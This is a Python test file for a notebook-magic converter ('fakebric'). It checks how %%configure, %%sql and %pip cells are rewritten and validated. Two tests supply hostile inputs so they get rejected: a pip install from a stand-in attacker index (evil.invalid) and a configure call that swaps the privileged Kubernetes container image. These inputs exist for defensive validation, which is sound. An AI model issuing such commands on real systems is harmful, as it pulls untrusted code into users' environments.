from types import SimpleNamespace
from fakebric.notebook_contract import apply_fakebric_magics


def test_configure_magic_is_preserved_as_runtime_metadata():
    class Notebook(dict):
        @property
        def cells(self): return self['cells']
    notebook=Notebook(metadata={},cells=[SimpleNamespace(cell_type='code',source='%%configure\n{"spark.executor.memory": "1g"}')])
    apply_fakebric_magics(notebook)
    assert notebook['metadata']['fakebric']['configure']['spark.executor.memory']=='1g'
    assert notebook.cells[0].source.startswith('# Fakebric %%configure')


def test_sql_magic_becomes_safe_spark_expression_and_preserves_source():
    class Notebook(dict):
        @property
        def cells(self): return self['cells']
    cell=SimpleNamespace(cell_type='code', id='sql-1', source='%%sql\nSELECT "a\\n b" AS value')
    notebook=Notebook(metadata={},cells=[cell])
    apply_fakebric_magics(notebook)
    assert notebook['metadata']['fakebric']['sqlCells']['sql-1']=='SELECT "a\\n b" AS value'
    assert cell.source.startswith('spark.sql(')
    assert 'SELECT' in cell.source


def test_sql_magic_rejects_empty_query():
    class Notebook(dict):
        @property
        def cells(self): return self['cells']
    notebook=Notebook(metadata={},cells=[SimpleNamespace(cell_type='code', source='%%sql\n')])
    try:
        apply_fakebric_magics(notebook)
    except ValueError as exc:
        assert str(exc)=='%%sql cell must contain a query'
    else:
        raise AssertionError('empty SQL should be rejected')


def test_pip_magic_is_recorded_and_uses_session_interpreter():
    class Notebook(dict):
        @property
        def cells(self): return self['cells']
    cell=SimpleNamespace(cell_type='code', id='pip-1', source='%pip install requests==2.32.3')
    notebook=Notebook(metadata={},cells=[cell])
    apply_fakebric_magics(notebook)
    assert notebook['metadata']['fakebric']['pipCells']['pip-1']==['requests==2.32.3']
    assert 'sys.executable' in cell.source and "'-m', 'pip', 'install'" in cell.source


def test_pip_magic_rejects_custom_indexes():
    class Notebook(dict):
        @property
        def cells(self): return self['cells']
    notebook=Notebook(metadata={},cells=[SimpleNamespace(cell_type='code', source='%pip install --index-url https://evil.invalid pkg')])
    try:
        apply_fakebric_magics(notebook)
    except ValueError as exc:
        assert 'custom indexes' in str(exc)
    else:
        raise AssertionError('custom pip indexes should be rejected')


def test_configure_rejects_privileged_cluster_properties():
    class Notebook(dict):
        @property
        def cells(self): return self['cells']
    notebook=Notebook(metadata={},cells=[SimpleNamespace(cell_type='code', source='%%configure\n{"spark.kubernetes.container.image":"evil"}')])
    try:
        apply_fakebric_magics(notebook)
    except ValueError as exc:
        assert 'not allowed' in str(exc)
    else:
        raise AssertionError('privileged configure property should be rejected')
